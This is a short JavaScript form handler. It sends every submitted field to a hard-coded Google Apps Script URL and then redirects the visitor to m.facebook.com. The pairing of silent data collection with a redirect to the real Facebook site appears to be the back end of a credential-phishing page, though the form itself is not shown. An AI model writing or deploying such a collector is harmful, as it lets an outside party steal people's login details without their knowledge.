const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyXjvJxEQT8zMYQ_dFzXhEzLaZyUYyJb9oWAHbiAtEo1CbBmrmy-bnBAnWprlZaGPpxkQ/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
